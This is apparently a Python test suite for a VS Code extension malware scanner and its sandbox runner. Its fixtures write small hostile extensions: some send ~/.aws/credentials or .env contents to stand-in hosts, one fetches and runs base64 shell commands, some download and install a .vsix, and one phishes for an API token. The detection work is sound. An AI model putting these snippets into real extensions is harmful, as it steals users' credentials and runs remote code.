        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"split-updater","version":"1.0.0","main":"extension.js"}', encoding="utf-8"
            )
            (root / "extension.js").write_text("require('./network');", encoding="utf-8")
            (root / "network.js").write_text("require('./installer'); fetch('https://worker.invalid/u.vsix');", encoding="utf-8")
            (root / "installer.js").write_text(
                "fs.writeFile('/tmp/u.vsix', data); vscode.commands.executeCommand('workbench.extensions.installExtension','/tmp/u.vsix');",
                encoding="utf-8",
            )
            report = scan_extension(root)

        finding = next(item for item in report.findings if item.rule_id == "remote-vsix-install-chain")
        self.assertEqual(report.decision, "review")
        self.assertEqual(finding.evidence["correlation"], "cross-file-import-connected-semantic-chain")
        self.assertEqual(finding.evidence["stages"]["download"], ["network.js"])

    def test_automatic_credential_prompt_download_execute_requires_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"credential-dropper","version":"1.0.0",'
                '"activationEvents":["*"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode=require('vscode'); const https=require('https');"
                "const cp=require('child_process');"
                "vscode.window.showInputBox({prompt:'Enter API token'});"
                "https.get('https://example.com/tool',()=>cp.execFile('/tmp/tool'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("download-and-execute", rule_ids)
        self.assertIn("credential-inputbox-prompt", rule_ids)
        self.assertIn("broad-activation", rule_ids)
        self.assertNotIn("preventive policy decision", report.decision_reason)

    def test_destructured_process_alias_cannot_bypass_download_execute_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"aliased-dropper","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode=require('vscode'); const https=require('https');"
                "const {execFile: launch}=require('node:child_process');"
                "vscode.window.showInputBox({prompt:'Enter access token'});"
                "https.get('https://example.com/payload',()=>launch('/tmp/payload'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("process-execution", rule_ids)
        self.assertIn("download-and-execute", rule_ids)

    def test_esm_process_alias_is_detected_without_bare_name_false_positive(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"esm-installer","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "import { spawn as launch } from 'child_process';"
                "fetch('https://example.com/tool').then(()=>launch('/tmp/tool'));",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})

    def test_transpiled_commonjs_namespace_process_alias_is_detected(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"transpiled-dropper","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'const child_process_1 = require("child_process");'
                'fetch("https://example.invalid/commands")'
                '.then(response => response.text())'
                '.then(command => (0, child_process_1.exec)(command));',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("process-execution", rule_ids)
        self.assertIn("dynamic-shell-execution", rule_ids)
        self.assertIn("download-and-execute", rule_ids)

    def test_namespace_process_alias_detection_is_bounded_for_generated_bundles(self) -> None:
        # Large transpiled bundles can contain many namespace aliases. The
        # alias resolver must not rescan the entire bundle once per alias and
        # once per method, or a normal extension becomes a multi-minute scan.
        source = "".join(
            f'const child_process_{index} = require("child_process");'
            for index in range(96)
        )
        source += "const filler = " + repr("x" * 1_000_000) + ";"
        source += "(0, child_process_95.execFile)(command);"

        started = time.monotonic()
        process_pattern, methods = _aliased_process_execution(source)
        elapsed = time.monotonic() - started

        self.assertIsNotNone(process_pattern)
        self.assertEqual(methods, {"execFile"})
        self.assertLess(elapsed, 5.0)

    def test_transpiled_base64_startup_command_chain_is_detected(self) -> None:
        """Keep the reported remote-text-fetcher behavior pattern covered."""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"remote-command-fetcher","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"]}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'const child_process_1 = require("child_process");'
                'fetch("http://localhost:3000/file.txt")'
                '.then(response => response.text())'
                '.then(text => text.split("\\n").forEach(line => '
                '(0, child_process_1.exec)(Buffer.from(line, "base64").toString("utf8"))));',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertIn("process-execution", rule_ids)
        self.assertIn("dynamic-shell-execution", rule_ids)
        self.assertIn("download-and-execute", rule_ids)

    def test_namespace_process_alias_property_access_is_not_execution(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"process-helper","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                'const child_process_1 = require("child_process");'
                'const method = child_process_1.exec;'
                'module.exports = { method };',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotIn("process-execution", {finding.rule_id for finding in report.findings})

    def test_far_apart_static_tokens_do_not_create_correlated_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"far-apart","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const token = process.env.API_TOKEN;\n"
                + "\n".join(f"const filler{i}=true;" for i in range(80))
                + "\nconst fs = require('fs'); fs.readFileSync('/tmp/example');\n"
                + "\n".join(f"const gap{i}=true;" for i in range(80))
                + "\nrequire('https').request('https://example.com').end();\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertNotEqual(report.verdict, "suspicious")
        self.assertNotIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})

    def test_credential_and_network_proximity_without_value_flow_stays_non_blocking(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"agent-client","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'),https=require('https');"
                "const config=fs.readFileSync(process.env.HOME+'/.env','utf8');"
                "const prompt=fs.readFileSync('/tmp/prompt.txt','utf8');"
                "const req=https.request({hostname:'api.example'});req.write(prompt);req.end();",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("credential-exfiltration-chain", rule_ids)
        self.assertNotEqual(report.decision, "block")

    def test_credential_path_alias_value_flow_remains_detected(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"path-alias-stealer","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'),https=require('https');"
                "const secretPath='/home/user/.aws/credentials';"
                "const secret=fs.readFileSync(secretPath);"
                "const req=https.request({hostname:'collector.example'});req.write(secret);req.end();",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("credential-identifier-flow-to-network", rule_ids)
        self.assertIn("credential-exfiltration-chain", rule_ids)
        self.assertEqual(report.decision, "block")

    def test_previous_report_deltas_are_reported_without_changing_verdict(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "current"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"example","name":"delta","version":"2.0.0","dependencies":{"left-pad":"1.3.0"}}',
                encoding="utf-8",
            )
            previous = root / "previous.json"
            previous.write_text(
                '{"extensions":[{"extension_id":"example.delta","version":"1.0.0","verdict":"clean",'
                '"risk_score":0,"malware_score":0,"dependencies":{},"artifact_inventory":{"risky_artifacts":[]}}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[extension], previous_report_file=previous)

        self.assertEqual(report["extensions"][0]["verdict"], "clean")
        self.assertEqual(report["version_deltas"][0]["extension_id"], "example.delta")
        self.assertIn("version", report["version_deltas"][0]["changes"])
        self.assertIn("dependencies", report["version_deltas"][0]["changes"])
        self.assertTrue(report["human_summary"])

    def test_sandbox_runner_plan_does_not_execute_by_default(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"sandboxed","version":"1.0.0",'
                '"scripts":{"postinstall":"echo should-not-run"}}',
                encoding="utf-8",
            )

            observations = run_sandbox(root)

        self.assertEqual(observations["mode"], "plan-only")
        self.assertEqual(observations["plan"]["extension_id"], "example.sandboxed")
        self.assertEqual(len(observations["plan"]["commands"]), 1)
        self.assertEqual(observations["extensions"]["example.sandboxed"], [])

    def test_sandbox_preflight_requires_the_same_isolation_boundary_as_runtime(self) -> None:
        completed = MagicMock(returncode=0, stdout="", stderr="")
        with patch("ide_scanner.sandbox_runner.shutil.which", return_value="/usr/bin/bwrap"), patch(
            "ide_scanner.sandbox_runner.subprocess.run", return_value=completed,
        ) as run:
            result = sandbox_preflight()

        self.assertEqual(result["status"], "ready")
        command = run.call_args.args[0]
        self.assertIn("--unshare-net", command)
        self.assertIn("--unshare-pid", command)
        self.assertIn("--chdir", command)
        self.assertEqual(command[command.index("--chdir") + 1], "/")
        self.assertEqual(command[-1], "/bin/true")

    def test_sandbox_preflight_can_delegate_namespace_creation_to_passwordless_sudo(self) -> None:
        completed = MagicMock(returncode=0, stdout="", stderr="")
        with patch.dict("os.environ", {RUNTIME_BWRAP_SUDO_ENV: "1"}), patch(
            "ide_scanner.sandbox_runner.shutil.which", return_value="/usr/bin/tool",
        ), patch("ide_scanner.sandbox_runner.subprocess.run", return_value=completed) as run:
            result = sandbox_preflight()

        self.assertEqual(result["status"], "ready")
        self.assertEqual(run.call_args.args[0][:3], ["sudo", "-n", "bwrap"])

    def test_sandbox_preflight_fails_closed_when_namespace_creation_is_denied(self) -> None:
        completed = MagicMock(returncode=1, stdout="", stderr="Operation not permitted")
        with patch("ide_scanner.sandbox_runner.shutil.which", return_value="/usr/bin/bwrap"), patch(
            "ide_scanner.sandbox_runner.subprocess.run", return_value=completed,
        ):
            result = sandbox_preflight()

        self.assertEqual(result["status"], "unavailable")
        self.assertIn("Operation not permitted", result["error"])

    def test_entrypoint_runner_supports_esm_activation_and_default_exports(self) -> None:
        with TemporaryDirectory() as tmp:
            runner = Path(tmp) / "activate-entrypoint.js"
            _write_entrypoint_runner(
                runner,
                {"main": "./extension.mjs", "type": "module"},
            )
            source = runner.read_text(encoding="utf-8")

        self.assertIn("pathToFileURL", source)
        self.assertIn("ERR_REQUIRE_ESM", source)
        self.assertIn("mod.default && mod.default.activate", source)

    def test_entrypoint_runner_keeps_manifest_absolute_paths_inside_artifact(self) -> None:
        with TemporaryDirectory() as tmp:
            runner = Path(tmp) / "activate-entrypoint.js"
            _write_entrypoint_runner(runner, {"main": "/dist/rn-extension"})
            source = runner.read_text(encoding="utf-8")

        self.assertIn('path.resolve(target, "dist/rn-extension")', source)

    def test_runtime_lifecycle_error_is_contextual_not_coverage_failure(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"lifecycle","version":"1.0.0"}',
                encoding="utf-8",
            )
            extension = scan_extension(root)
            finding = _sandbox_observation_finding(
                extension,
                {
                    "kind": "runtime_lifecycle_error",
                    "phase": "lifecycle",
                    "script": "postinstall",
                    "returncode": 127,
                },
            )

        self.assertIsNotNone(finding)
        assert finding is not None
        self.assertEqual(finding.rule_id, "runtime-lifecycle-error")
        self.assertEqual(finding.to_dict()["effective_severity"], "INFO")

    def test_sandbox_runtime_exfil_requires_canary_in_network_body(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            canary_file = root / "home" / ".aws" / "credentials"
            trace = root / "trace.jsonl"
            events = [
                {"kind": "fs_read", "path": str(canary_file), "api": "readFileSync"},
                {"kind": "network", "target": "https://example.invalid"},
                {"kind": "network_write", "contains_canary": False, "bytes": 4},
            ]
            trace.write_text("\n".join(json.dumps(item) for item in events) + "\n", encoding="utf-8")
            observations = _observations_from_trace(trace, [str(canary_file)])

        kinds = {item["kind"] for item in observations}
        self.assertIn("secret_read", kinds)
        self.assertIn("network_attempt", kinds)
        self.assertNotIn("secret_exfil", kinds)

    def test_sandbox_canary_in_process_output_is_not_exfiltration(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"canary-output","version":"1.0.0"}',
                encoding="utf-8",
            )
            extension = scan_extension(root)
            finding = _sandbox_observation_finding(
                extension,
                {
                    "kind": "canary_exposed",
                    "destination": "stdout-or-stderr",
                    "evidence": "synthetic canary appeared in process output; no external transfer was observed",
                },
            )

        self.assertIsNotNone(finding)
        assert finding is not None
        self.assertEqual(finding.rule_id, "runtime-canary-exposed")
        self.assertEqual(finding.evidence["evidence_class"], "weak")
        self.assertEqual(finding.to_dict()["actionability"], "contextual")
        self.assertEqual(finding.to_dict()["effective_severity"], "INFO")

    def test_sandbox_timeout_is_visible_but_not_decision_relevant(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"timeout","version":"1.0.0"}',
                encoding="utf-8",
            )
            extension = scan_extension(root)
            finding = _sandbox_observation_finding(
                extension,
                {"kind": "runtime_timeout", "phase": "activation", "evidence": "timed out"},
            )

        self.assertIsNotNone(finding)
        assert finding is not None
        self.assertEqual(finding.rule_id, "sandbox-runtime-timeout")
        self.assertEqual(finding.evidence["evidence_class"], "weak")
        self.assertEqual(finding.to_dict()["actionability"], "contextual")
        self.assertEqual(finding.to_dict()["effective_severity"], "INFO")

    def test_sandbox_capability_observations_are_contextual_without_canary_abuse(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"capabilities","version":"1.0.0"}',
                encoding="utf-8",
            )
            extension = scan_extension(root)
            observations = [
                {"kind": "network_attempt", "destination": "https://example.invalid"},
                {"kind": "process_exec", "command": "language-server --stdio"},
                {"kind": "filesystem_write", "path": "/tmp/cache"},
            ]
            findings = [_sandbox_observation_finding(extension, item) for item in observations]

        self.assertEqual(
            {finding.rule_id for finding in findings if finding is not None},
            {"runtime-network-attempt", "runtime-process-execution", "runtime-filesystem-write"},
        )
        self.assertTrue(all(finding is not None and finding.to_dict()["actionability"] == "contextual" for finding in findings))

    def test_runtime_observations_are_aggregated_with_bounded_samples(self) -> None:
        observations = _aggregate_sandbox_observations([
            {"kind": "filesystem_write", "path": f"/workspace/cache-{index}.json", "api": "fs.writeFile"}
            for index in range(40)
        ])

        self.assertEqual(len(observations), 1)
        self.assertEqual(observations[0]["kind"], "filesystem_write")
        self.assertEqual(observations[0]["observation_count"], 40)
        self.assertEqual(len(observations[0]["path_samples"]), 25)

    def test_runtime_finding_is_labeled_dynamic_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"runtime-label","version":"1.0.0"}',
                encoding="utf-8",
            )
            extension = scan_extension(root)
            finding = _sandbox_observation_finding(
                extension,
                {"kind": "process_exec", "command": "language-server --stdio", "observation_count": 3},
            )

        self.assertIsNotNone(finding)
        assert finding is not None
        self.assertEqual(finding.evidence_type, "dynamic")
        self.assertEqual(finding.evidence["observation_count"], 3)

    def test_sandbox_undeclared_process_or_network_routes_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"capability-only","version":"1.0.0"}',
                encoding="utf-8",
            )
            observations = root / "observations.json"
            observations.write_text(json.dumps({
                "extensions": {
                    "example.capability-only": [
                        {"kind": "network_attempt", "destination": "https://example.invalid"},
                        {"kind": "process_exec", "command": "language-server --stdio"},
                        {"kind": "filesystem_write", "path": "/tmp/cache"},
                    ],
                },
            }), encoding="utf-8")
            report = scan_targets(
                paths=[root],
                sandbox_observations_file=observations,
                include_posture=False,
            )

        extension = report["extensions"][0]
        self.assertEqual(extension["decision"], "review")
        self.assertEqual(extension["verdict"], "suspicious")
        self.assertEqual(extension["public_outcome"], "investigate")
        self.assertEqual(extension["malware_score"], 0)
        self.assertEqual(extension["score_details"]["components"]["observed_behavior"], 60)
        self.assertEqual(extension["score_details"]["risk_score"], extension["risk_score"])
        self.assertEqual(extension["analysis_status"], "complete")

    def test_sandbox_rejects_unsafe_runtime_inputs(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "extension"
            extension.mkdir()
            (extension / "package.json").write_text("{}", encoding="utf-8")
            with self.assertRaises(ValueError):
                run_sandbox(extension, timeout_seconds=0)

            archive = root / "unsafe.vsix"
            with zipfile.ZipFile(archive, "w") as handle:
                handle.writestr("../escape.txt", "unsafe")
            with self.assertRaises(ValueError):
                _prepare_target(archive, root / "extracted")

            compressed = root / "compressed.vsix"
            with zipfile.ZipFile(compressed, "w", compression=zipfile.ZIP_DEFLATED) as handle:
                handle.writestr("extension/package.json", "a" * 10_000)
            with patch("ide_scanner.sandbox_runner.MAX_RUNTIME_COMPRESSION_RATIO", 1):
                with self.assertRaisesRegex(ValueError, "compression ratio"):
                    _prepare_target(compressed, root / "compressed-extracted")

    def test_sandbox_runner_runtime_instrumentation_observes_secret_exfil(self) -> None:
        self._skip_if_runtime_backend_unavailable()
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"runtime","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'); const https=require('https');"
                "function activate(){"
                "const data=fs.readFileSync(process.env.HOME+'/.aws/credentials','utf8');"
                "const req=https.request('https://example.invalid/collect',{method:'POST'});"
                "req.write(data); req.end();"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            observations = run_sandbox(root, allow_execute=True, timeout_seconds=5)

        self.assertEqual(observations["mode"], "executed")
        self.assertEqual(observations["plan"]["backend"], "bubblewrap")
        runtime_observations = observations["extensions"]["example.runtime"]
        kinds = {item["kind"] for item in runtime_observations}
        self.assertIn("secret_read", kinds)
        self.assertIn("network_attempt", kinds)
        self.assertIn("secret_exfil", kinds)

    def test_sandbox_trace_normalizes_global_fetch_canary_writes(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "trace.jsonl"
            trace.write_text(json.dumps({
                "kind": "network",
                "api": "global.fetch",
                "target": "https://example.invalid/collect",
            }) + "\n" + json.dumps({
                "kind": "network_write",
                "target": "https://example.invalid/collect",
                "contains_canary": True,
                "bytes": 42,
            }) + "\n", encoding="utf-8")

            observations = _observations_from_trace(trace, [])

        self.assertIn("network_attempt", {item["kind"] for item in observations})
        self.assertIn("secret_exfil", {item["kind"] for item in observations})

    def test_runtime_evidence_redacts_extension_supplied_secrets(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "trace.jsonl"
            trace.write_text("\n".join(json.dumps(item) for item in [
                {
                    "kind": "network",
                    "api": "global.fetch",
                    "target": "https://user:pass@example.invalid/collect?token=token-value&safe=1",
                },
                {
                    "kind": "process_exec",
                    "api": "execFile",
                    "command": "curl https://example.invalid/bootstrap --token token-value",
                },
                {
                    "kind": "command_probe_error",
                    "error": "Bearer bearer-value",
                },
            ]) + "\n", encoding="utf-8")
            observations = _observations_from_trace(trace, [])

        serialized = json.dumps(observations, sort_keys=True)
        self.assertNotIn("token-value", serialized)
        self.assertNotIn("user:pass", serialized)
        self.assertNotIn("bearer-value", serialized)
        self.assertIn("network_attempt", {item["kind"] for item in observations})
        self.assertIn("download_execute", {item["kind"] for item in observations})
        self.assertIn("[redacted]", serialized)

    def test_runtime_event_transport_rejects_forged_events(self) -> None:
        secret = "a" * 64
        payload = json.dumps({"kind": "network", "target": "https://example.invalid"}, separators=(",", ":"))
        encoded = base64.b64encode(payload.encode("utf-8")).decode("ascii")
        mac = hmac.new(secret.encode("utf-8"), payload.encode("utf-8"), hashlib.sha256).hexdigest()
        valid_output = "\n".join([
            f"{RUNTIME_EVENT_HANDSHAKE}{secret}",
            f"{RUNTIME_EVENT_PREFIX}{encoded}.{mac}",
        ])
        events, valid = _verified_runtime_events(valid_output)
        self.assertTrue(valid)
        self.assertEqual(events[0]["kind"], "network")

        forged_payload = payload.replace("example.invalid", "attacker.invalid")
        forged_encoded = base64.b64encode(forged_payload.encode("utf-8")).decode("ascii")
        forged_output = "\n".join([
            f"{RUNTIME_EVENT_HANDSHAKE}{secret}",
            f"{RUNTIME_EVENT_PREFIX}{forged_encoded}.{mac}",
        ])
        forged_events, forged_valid = _verified_runtime_events(forged_output)
        self.assertFalse(forged_valid)
        self.assertEqual(forged_events, [])

    def test_runtime_event_transport_rejects_truncated_output(self) -> None:
        events, valid = _verified_runtime_events(
            f"{RUNTIME_EVENT_HANDSHAKE}{'a' * 64}\n{RUNTIME_EVENT_OUTPUT_LIMIT_MARKER}"
        )
        self.assertFalse(valid)
        self.assertEqual(events, [])

    def test_runtime_event_transport_rejects_duplicate_handshake(self) -> None:
        events, valid = _verified_runtime_events(
            "\n".join([
                f"{RUNTIME_EVENT_HANDSHAKE}{'a' * 64}",
                f"{RUNTIME_EVENT_HANDSHAKE}{'b' * 64}",
            ])
        )
        self.assertFalse(valid)
        self.assertEqual(events, [])

    def test_external_syscall_trace_recovers_native_runtime_capabilities(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "runtime.strace"
            trace.write_text(
                '123 openat(AT_FDCWD, "/home/guardrails/.aws/credentials", O_RDONLY) = 3\n'
                '123 connect(3, {sa_family=AF_INET, sin_addr=inet_addr("203.0.113.7")}, 16) = -1 EPERM\n'
                '123 execve("/bin/sh", ["sh"], 0x0) = 0\n'
                '123 unlink("/home/guardrails/.probe") = 0\n',
                encoding="utf-8",
            )
            result = subprocess.CompletedProcess(["strace"], 0, "", "")
            setattr(result, "_guardrails_external_trace_prefix", str(trace))
            observations, valid = _external_trace_observations(
                result,
                ["/home/guardrails/.aws/credentials"],
            )

        self.assertTrue(valid)
        kinds = {item["kind"] for item in observations}
        self.assertIn("secret_read", kinds)
        self.assertIn("network_attempt", kinds)
        self.assertIn("process_exec", kinds)
        self.assertIn("filesystem_write", kinds)

    def test_external_syscall_trace_ignores_unnamed_kernel_network_control(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "runtime.strace"
            trace.write_text(
                '123 connect(3, {sa_family=AF_NETLINK}, 12) = 0\n'
                '123 sendto(3, "setup", 5, 0, {sa_family=AF_UNSPEC}, 16) = 5\n'
                '123 connect(4, {sa_family=AF_UNIX, sun_path="/run/extension.sock"}, 24) = -1 ECONNREFUSED\n',
                encoding="utf-8",
            )
            result = subprocess.CompletedProcess(["strace"], 0, "", "")
            setattr(result, "_guardrails_external_trace_prefix", str(trace))
            observations, valid = _external_trace_observations(result, [])

        self.assertTrue(valid)
        self.assertEqual(observations, [{
            "kind": "network_attempt",
            "destination": "/run/extension.sock",
            "api": "strace.connect",
        }])

    def test_external_syscall_trace_ignores_bubblewrap_setup_paths(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "runtime.strace"
            trace.write_text(
                '123 mkdir("proc", 0755) = 0\n'
                '123 openat(AT_FDCWD, "uid_map", O_WRONLY) = 3\n'
                '123 openat(AT_FDCWD, "/target/user-data.json", O_WRONLY|O_CREAT) = 3\n',
                encoding="utf-8",
            )
            result = subprocess.CompletedProcess(["strace"], 0, "", "")
            setattr(result, "_guardrails_external_trace_prefix", str(trace))
            observations, valid = _external_trace_observations(result, [])

        self.assertTrue(valid)
        self.assertEqual(observations, [{
            "kind": "filesystem_write",
            "path": "/target/user-data.json",
            "api": "strace.openat",
        }])

    def test_external_syscall_trace_ignores_bubblewrap_root_and_device_plumbing(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "runtime.strace"
            trace.write_text(
                '123 mkdir("/newroot/usr", 0755) = 0\n'
                '123 openat(AT_FDCWD, "/dev/tty", O_WRONLY) = 3\n'
                '123 execve("/usr/bin/bwrap", ["bwrap"], 0x0) = 0\n'
                '123 openat(AT_FDCWD, "/workspace/user-data.json", O_WRONLY|O_CREAT) = 3\n',
                encoding="utf-8",
            )
            result = subprocess.CompletedProcess(["strace"], 0, "", "")
            setattr(result, "_guardrails_external_trace_prefix", str(trace))
            observations, valid = _external_trace_observations(result, [])

        self.assertTrue(valid)
        self.assertEqual(observations, [{
            "kind": "filesystem_write",
            "path": "/workspace/user-data.json",
            "api": "strace.openat",
        }])

    def test_external_syscall_trace_filters_harness_execs_but_keeps_extension_children(self) -> None:
        with TemporaryDirectory() as tmp:
            trace = Path(tmp) / "runtime.strace"
            trace.write_text(
                '123 execve("/usr/bin/strace", ["strace"], 0x0) = 0\n'
                '123 execve("/usr/bin/bwrap", ["bwrap"], 0x0) = 0\n'
                '123 execve("/usr/local/bin/node", ["node", "/runner/activate-entrypoint.js"], 0x0) = 0\n'
                '124 execve("/usr/local/bin/node", ["node", "/target/language-server.js"], 0x0) = 0\n'
                '125 execve("/usr/bin/curl", ["curl", "https://example.invalid"], 0x0) = 0\n',
                encoding="utf-8",
            )
            result = subprocess.CompletedProcess(["strace"], 0, "", "")
            setattr(result, "_guardrails_external_trace_prefix", str(trace))
            observations, valid = _external_trace_observations(result, [])

        self.assertTrue(valid)
        self.assertEqual(
            [item["command"] for item in observations if item["kind"] == "process_exec"],
            ["/usr/local/bin/node", "/usr/bin/curl"],
        )

    def test_external_syscall_trace_wraps_bubblewrap_when_requested(self) -> None:
        completed = subprocess.CompletedProcess(["strace"], 0, "", "")
        which = lambda name: "/usr/bin/bwrap" if name == "bwrap" else "/usr/bin/strace"
        with patch.dict("os.environ", {EXTERNAL_TRACE_ENV: "1"}), patch(
            "ide_scanner.sandbox_runner.shutil.which", side_effect=which,
        ), patch("ide_scanner.sandbox_runner._run_bounded_capture", return_value=completed) as run:
            result = _run_isolated(
                ["/bin/true"],
                target=Path("/tmp/target"),
                home=Path("/tmp/home"),
                workspace=Path("/tmp/workspace"),
                hook_file=Path("/tmp/hook"),
                trace_file=Path("/tmp/trace.jsonl"),
                entrypoint_runner=Path("/tmp/runner"),
                cwd="/workspace",
                capture_output=True,
                text=True,
                timeout=1,
                check=False,
            )

        command = run.call_args.args[0]
        self.assertEqual(command[0], "/usr/bin/strace")
        self.assertIn("bwrap", command)
        self.assertTrue(getattr(result, "_guardrails_external_trace_prefix", ""))

    def test_runtime_output_is_bounded_and_marks_transport_incomplete(self) -> None:
        result = _run_bounded_capture(
            [sys.executable, "-c", "import sys; sys.stdout.write('x' * (4 * 1024 * 1024 + 1))"],
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
        self.assertLessEqual(len(result.stdout.encode("utf-8")), MAX_RUNTIME_OUTPUT_BYTES)
        self.assertIn(RUNTIME_EVENT_OUTPUT_LIMIT_MARKER, result.stderr)

    def test_sandbox_runner_probes_registered_commands_and_webview_messages(self) -> None:
        self._skip_if_runtime_backend_unavailable()
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"agentic-runtime","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const fs=require('fs'); const https=require('https'); const vscode=require('vscode');"
                "function collect(){"
                "const data=fs.readFileSync(process.env.HOME+'/.env','utf8');"
                "fs.writeFileSync(process.env.HOME+'/.probe',data);"
                "const req=https.request('https://example.invalid/collect',{method:'POST'});"
                "req.write(data); req.end();"
                "}"
                "function activate(){"
                "vscode.commands.registerCommand('example.collect',collect);"
                "const panel=vscode.window.createWebviewPanel('example','Example',1,{});"
                "panel.webview.onDidReceiveMessage(()=>undefined);"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            observations = run_sandbox(root, allow_execute=True, timeout_seconds=5)

        runtime_observations = observations["extensions"]["example.agentic-runtime"]
        kinds = {item["kind"] for item in runtime_observations}
        self.assertIn("runtime_command_registered", kinds)
        self.assertIn("runtime_command_probe", kinds)
        self.assertIn("runtime_webview_created", kinds)
        self.assertIn("runtime_webview_message_probe", kinds)
        self.assertIn("filesystem_write", kinds)
        self.assertIn("secret_exfil", kinds)

    def _skip_if_runtime_backend_unavailable(self) -> None:
        preflight = sandbox_preflight()
        if preflight.get("status") != "ready":
            self.skipTest(f"controlled runtime backend unavailable: {preflight.get('error', 'unknown error')}")

    def test_repo_binary_artifacts_metric_fires_for_committed_native_binary(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native-binary-payload")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("repo-binary-artifacts", rule_ids)
        self.assertIn("binary-without-origin", rule_ids)
        self.assertEqual(report.malware_score, 0)
